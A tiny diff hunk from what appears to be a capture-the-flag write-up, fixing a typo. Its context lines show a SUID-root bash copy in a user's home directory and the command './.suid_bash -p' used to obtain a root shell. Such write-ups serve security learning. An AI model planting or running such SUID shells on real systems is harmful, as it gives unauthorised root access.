@@ -89,5 +89,5 @@ In home/james ---> -rwsr-sr-x 1 root  root  1113504 Jul 22  2020 .suid_bash
 
 $ ./.suid_bash -p
 
----> we wouls get root shell
+---> we would get root shell
 
